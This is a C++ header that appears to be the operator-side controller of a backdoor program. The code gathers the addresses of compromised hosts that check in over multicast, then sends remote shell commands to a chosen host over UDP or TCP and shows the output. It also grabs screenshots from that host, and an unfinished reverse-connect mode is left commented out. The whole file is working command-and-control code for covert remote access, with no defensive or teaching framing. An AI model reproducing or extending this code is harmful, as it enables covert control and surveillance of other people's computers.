#pragma once
#include <protocol\BDoorProtocol.h>
#include <other\tools.h>
#define RETURNSTR "返回"
#define EXITSTR "退出"
#define EXIT_VALUE 3
class Command {
private:
	const string name;
public:
	virtual int Func(string command,string& returnmess) = 0;
	virtual string GetName() = 0;
};
class SearchHost:public Command{
private:
	const string name = "主机列表";
	list<sockaddr_in> host_list;
	SOCKET group_socket;
public:
	SearchHost() {
		thread([this]() {
			group_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			sockaddr_in group_addr;
			group_addr.sin_family = AF_INET;
			group_addr.sin_addr.s_addr = htonl(INADDR_ANY);
			group_addr.sin_port = htons(GROUP_PORT);
			bindport(group_socket, (const sockaddr*)&group_addr, sizeof(group_addr));
			ip_mreq mreq;
			mreq.imr_multiaddr.s_addr = inet_addr(GROUP_IP);
			mreq.imr_interface.s_addr = INADDR_ANY;
			setsockopt(group_socket, IPPROTO_IP, IP_ADD_MEMBERSHIP, (char*)&mreq, sizeof(mreq));
			int Result;
			sockaddr_in sender_addr;
			int sender_addr_size = sizeof(sender_addr);
			while (true) {
				char buf[1024];
				Result = recvfrom(group_socket, buf, sizeof(buf), 0, (sockaddr*)&sender_addr, &sender_addr_size);
				if (Result == SOCKET_ERROR) {
					DebugLog(string("recvfrom failed with error: ")+ to_string(WSAGetLastError()));
				}
				else {
					host_list.push_back(sender_addr);
					host_list.unique();
				}
			}
			}).detach();
	}
	~SearchHost() {
		if (group_socket != INVALID_SOCKET) {
			closesocket(group_socket);
		}
	}
	int Func(string command, string& returnmess) {
		if (command == "查看主机列表"|| command == "host") {
			returnmess += "主机列表：\n\n";
			for (auto e : host_list) {
				returnmess += string(inet_ntoa(e.sin_addr))+"\n";
			}
			return END;
		}
		else if (command == "清空主机列表"|| command == "clear") {
			host_list.clear();
			return END;
		}
		else {
			return NOTCOM;
		}
	}
	list<sockaddr_in>& GetHostList() { return host_list; }
	string GetName() override { return name; }
};
class UDP:public Command{
private:
	class Cmd :public Command {
	private:
		const string name = "cmd";
		SOCKET &udp_socket;
		sockaddr_in &udp_addr;
		int step = 0;
	public:
		Cmd(SOCKET& udp_socket_a, sockaddr_in& udp_addr_a) :udp_socket(udp_socket_a), udp_addr(udp_addr_a) {

		}
		int Func(string command, string& returnmess) {
			if (step == 0) {
				if (command == name) {
					DebugLog("cmd模式");
					step++;
					return ENTRANCE;
				}else {
					return NOTCOM;
				}
			}
			else if (step == 1) {
				if (command == RETURNSTR) {
					step = 0;
					return END;
				}
				string recvmess;
				if (udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,command).dump()) < 0) {
					returnmess = SENDERROR;
					return ERROR;
				}
				sockaddr_in sender_addr;
				if (udp::RecvfromBase64(udp_socket,sender_addr,recvmess)< 0) {
					returnmess = RECVERROR;
					return ERROR;
				}
				
				returnmess = DecodeBase64(json::parse(recvmess)[CONTENT].dump(), false);
				return ENTRANCE;
			}
		}
		string GetName() override { return name; }
	};
	const string name = "udp";
	SOCKET udp_socket;
	sockaddr_in udp_addr;
	int step = 0;
	Command* entrance = nullptr;
	Cmd cmd = Cmd(udp_socket,udp_addr);
	
public:
	vector<Command*> command_list = { &cmd };
	UDP() {
		udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(UDP_PORT);
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(udp_socket, (const sockaddr*)&addr, sizeof(addr));
		udp_addr.sin_family = AF_INET;
		udp_addr.sin_port = htons(UDP_PORT);
	}
	~UDP() {
		if (udp_socket != INVALID_SOCKET) {
			closesocket(udp_socket);
		}
	}
	int Func(string command, string& returnmess) override {
		if (step == 0) {
			vector<string> command_split;
			split_string(command, " ", command_split);
			if (command_split[0] == name) {
				if (command_split.size() < 2) {
					returnmess = IPEMPTY;
					return ERROR;
				}
				if (check_ip(command_split[1])) {
					udp_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
					DebugLog(string("udp模式 连接：") + inet_ntoa(udp_addr.sin_addr));
					step++;
					return ENTRANCE;
				}
				else {
					returnmess = IPERROR;
					return ERROR;
				}
			}
			else {
				return NOTCOM;
			}
		}
		else if (step == 1) {
			if (command == RETURNSTR && entrance == nullptr) {
				step = 0;
				return END;
			}
			bool is_com = false;
			int Result;
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result != NOTCOM) {
					is_com = true;
				}
				switch (Result)
				{
				case END:
					entrance = nullptr;
					return ENTRANCE;
				case ENTRANCE:
					if (!is_entrance) { entrance = command_list[i]; }
					return ENTRANCE;
				case ERROR:
					entrance = nullptr;
					return ENTRANCE;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + string(NOT_ANY_COMMAND);
				return ENTRANCE;
			}
		}
	}

	SOCKET& GetUdpSocket() { return udp_socket; }
	string GetEntranceName() { return entrance->GetName(); }
	string GetName() override { return name; }
};
class TCP: public Command {
private:
	class Cmd :public Command {
	private:
		const string name = "cmd";
		SOCKET &connect_socket;
		int step = 0;

	public:
		Cmd(SOCKET &connect_socket_a):connect_socket(connect_socket_a) {

		}
		int Func(string command, string& returnmess) {
			if (step == 0) {
				if (command == name) {
					step++;
					return ENTRANCE;
				}
				else {return NOTCOM;}
			}
			else if (step == 1) {
				if (command == RETURNSTR) {
					step = 0;
					return END;
				}
				int Result;
				Result = tcp::SendBase64(connect_socket, FormatJson(name, command).dump());
				if (Result == -1) {
					returnmess = SENDERROR;
					return ERROR;
				}
				else if (Result == 0) {
					returnmess = DISCONNECT;
					return ERROR;
				}
				string recvmess;
				Result = tcp::RecvBase64(connect_socket, recvmess);
				if (Result == -1) {
					returnmess = RECVERROR;
					return ERROR;
				}
				else if (Result == 0) {
					returnmess = DISCONNECT;
					return ERROR;
				}
				if (recvmess.empty()) {
					returnmess = NODATA;
					return ERROR;
				}
				else {
					returnmess = DecodeBase64(string(json::parse(recvmess)[CONTENT]),false);
					return ENTRANCE;
				}
			}	
		}
		string GetName() override { return name; }
	};
	class ScreenShot :public Command {
	private:
		const string name = "screenshot";
		SOCKET &connect_socket;
	public:
		ScreenShot(SOCKET& connect_socket_a) :connect_socket(connect_socket_a) {}
		int Func(string command,string &returnmess)override {
			vector<string> com_spl;
			split_string(command, " ", com_spl);
			if(com_spl[0] == "截图"||com_spl[0] == "scr"||com_spl[0] == "screenshot") {
				if (com_spl.size() < 2) {
					returnmess = "图像保存路径不能为空";
					return ERROR;
				}
				else {
					vector<string> filepath_spl;
					split_string(com_spl[1], "\\", filepath_spl);
					vector<string> filename_spl;
					split_string(filepath_spl.back(), ".", filename_spl);
					if (filename_spl.size() < 2) {
						returnmess = "图像格式未知";
						return ERROR;
					}
					else if (VectorFind(image_format, filepath_spl.back())) {
						returnmess = "图像格式不支持";
						return ERROR;
					}
					json sendmess = FormatJson(name);
					sendmess[CONTENT][IMAGEFORMAT] = filename_spl.back();
					int Result = tcp::SendBase64(connect_socket, sendmess.dump());
					if (Result == -1) {
						returnmess = SENDERROR;
						return ERROR;
					}
					else if (Result == 0) {
						returnmess = DISCONNECT;
						return ERROR;
					}
					string recvmess;
					Result = tcp::RecvBase64(connect_socket, recvmess);
					if (Result <= 0) { return ERROR; }
					DebugLog("img_data size: " + to_string(recvmess.size()));
					//json recvjson = json::parse(recvmess);
					ofstream ofs(com_spl[1], ios::out|ios::binary);
					ofs.write(reinterpret_cast<const char*>(recvmess.data()), recvmess.size());
					ofs.close();	
					returnmess = "null";
					return END;
				}
			}
			else {
				return NOTCOM;
			}
		}
		string GetName()override { return name; }
	};
	const string name = "tcp";
	SOCKET /*listen_socket,*/ connect_socket;
	sockaddr_in connect_addr/*, listen_addr*/;
	Command* entrance = nullptr;
	int step = 0;
	Cmd cmd = Cmd(connect_socket);
	ScreenShot screenshot = ScreenShot(connect_socket);
	vector<Command*> command_list = { &cmd,&screenshot };
public:
	TCP() {
		/*listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&listen_addr, 0, sizeof(listen_addr));
		listen_addr.sin_family = AF_INET;
		listen_addr.sin_port = htons(TCP_PORT);
		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));*/
		connect_addr = CreateSockAddrIn(TCP_PORT);
	}
	~TCP() {
		if (connect_socket != INVALID_SOCKET) {
			closesocket(connect_socket);
		}
		/*if (listen_socket != INVALID_SOCKET) {
			closesocket(listen_socket);
		}*/
	}
	int Func(string command,string &returnmess) override {
		if (step == 0) {
			vector <string>command_split;
			split_string(command, " ", command_split);
			if (/*command_split[0] == "reversetcp" || */command_split[0] == name) {
				if (command_split.size() < 2) {
					returnmess = IPEMPTY;
					return ERROR;
				}
				if (check_ip(command_split[1])) {
					connect_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
					/*if (command_split[0] == "reversetcp") {
						step = 10;
					}*/
					if (command_split[0] == name) {
						step++;
					}
					return ENTRANCE;
				}
				else {
					returnmess = IPERROR;
					return ERROR;
				}
			}
			else {
				return NOTCOM;
			}
		}
		else if (step == 1) {
			if (command == RETURNSTR&&entrance == nullptr) {
				step = 0;
				return END;
			}
			bool is_com = false;
			int Result;
			connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			connect(connect_socket, (const sockaddr*)&connect_addr, sizeof(connect_addr));

			int Timeout = TIMEOUT;
			//设置发送超时为1000ms
			if (SOCKET_ERROR == setsockopt(this->connect_socket, SOL_SOCKET, SO_SNDTIMEO, (char*)&Timeout, sizeof(int)))
			{
				fprintf(stderr, "Set SO_SNDTIMEO error !\n");
			}

			//设置接收超时为1000ms
			if (SOCKET_ERROR == setsockopt(this->connect_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&Timeout, sizeof(int)))
			{
				fprintf(stderr, "Set SO_RCVTIMEO error !\n");
			}
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result != NOTCOM) {
					int Result2 = shutdown(connect_socket, SD_BOTH);
					if (Result2 == SOCKET_ERROR) {
						DebugLog("shutdown failed with error: " + WSAGetLastError());
						returnmess = SHUTDOWN_ERROR;
						return ERROR;
					}
					if (connect_socket != INVALID_SOCKET) {
						Result2 = closesocket(connect_socket);
						if (Result2 == SOCKET_ERROR) {
							DebugLog("closesocket failed with error: " + WSAGetLastError());
							returnmess = COLSESOCKET_ERROR;
							return ERROR;
						}
					}
					is_com = true;
				}
				switch (Result)
				{
				case END:
					entrance = nullptr;
					return ENTRANCE;
				case ENTRANCE:
					if(!is_entrance){entrance = command_list[i];}
					return ENTRANCE;
				case ERROR:
					entrance = nullptr;
					return ENTRANCE;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
				return NOTCOM;
			}
		}	
		/*
		if (step == 10) {
			if (command == RETURNSTR) {
				step = 0;
				return END;
			}
			SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			sockaddr_in addr = CreateSockAddrIn(REVERSE_PORT);
			bindport(reverse_socket, (const sockaddr*)&addr, sizeof(addr));
			sockaddr_in target_addr = CreateSockAddrIn(inet_ntoa(connect_addr.sin_addr), REVERSE_PORT);
			int Result = udp::SendtoBase64(reverse_socket, target_addr, FormatJson(name, REVERSECONNECT).dump());
			if (Result == -1) {
				DebugLog(SENDERROR);
				return ERROR;
			}
			else if (Result == 0) {
				DebugLog(DISCONNECT);
				return ERROR;
			}
			listen(listen_socket, 5);
			sockaddr_in addr1;
			int addr1_len = sizeof(addr1);
			connect_socket = accept(listen_socket, (sockaddr*)&addr1, &addr1_len);
			bool is_com = false;
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result != 0) {
					int Result2 = shutdown(reverse_socket, SD_BOTH);
					if (Result2 == SOCKET_ERROR) {
						DebugLog(string("reverse_socket shutdown failed with error: ") + to_string(WSAGetLastError()));
						returnmess = SHUTDOWN_ERROR;
						return ERROR;
					}
					if (reverse_socket != INVALID_SOCKET) {
						Result2 = closesocket(reverse_socket);
						if (Result2 == SOCKET_ERROR) {
							DebugLog(string("reverse_socket closesocket failed with error: ") + to_string(WSAGetLastError()));
							returnmess = COLSESOCKET_ERROR;
							return ERROR;
						}
					}
					Result2 = shutdown(connect_socket, SD_BOTH);
					if (Result2 == SOCKET_ERROR) {
						DebugLog(string("connect_socket shutdown failed with error: ") + to_string(WSAGetLastError()));
						returnmess = SHUTDOWN_ERROR;
						//return ERROR;
					}
					if (connect_socket != INVALID_SOCKET) {
						Result2 = closesocket(connect_socket);
						if (Result2 == SOCKET_ERROR) {
							DebugLog(string("connect_socket closesocket failed with error: ") + to_string(WSAGetLastError()));
							returnmess = COLSESOCKET_ERROR;
							return ERROR;
						}
					}
					is_com = true;
				}
				switch (Result)
				{
				case END:
					entrance = nullptr;
					return ENTRANCE;
				case ENTRANCE:
					if (!is_entrance) { entrance = command_list[i]; }
					return ENTRANCE;
				case ERROR:
					entrance = nullptr;
					return ENTRANCE;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
				return NOTCOM;
			}
		}*/
	}
	string GetEntranceName() { return entrance->GetName(); }
	string GetName() override { return name; }
};
class BDoorControl {
private:
	int wsa = WSAInit();
	SearchHost search_host = SearchHost();
	UDP udp = UDP();
	TCP tcp = TCP();
	vector<Command*> command_list = {&search_host,&udp,&tcp};
	Command *entrance = nullptr;
public:
	
	int EnterCommand(string command, string& returnmess) {
		
		if (command.empty()) {
			returnmess = "";
			return 0;
		}
		if (command == EXITSTR) { return EXIT_VALUE; }
		bool is_com = false;
		int Result;
		for (int i = 0; i < command_list.size(); i++) {
			bool is_entrance = false;
			if (entrance != nullptr) {
				Result = entrance->Func(command, returnmess);
				is_entrance = true;
			}
			else {
				Result = command_list[i]->Func(command, returnmess);
			}
			if (Result != 0) {
				is_com = true;
			}
			switch (Result)
			{
			case END:
				entrance = nullptr;
				return 1;
			case ENTRANCE:
				if (!is_entrance) {entrance = command_list[i];}
				return 1;
			case ERROR:
				entrance = nullptr;
				return -1;
			default:
				break;
			}
			if(is_entrance){break;}
		}
		if (!is_com) {
			returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
			return 0;
		}
	}
	string GetEntranceName() {return entrance->GetName();}
	~BDoorControl() {
		WSACleanup();
	}
};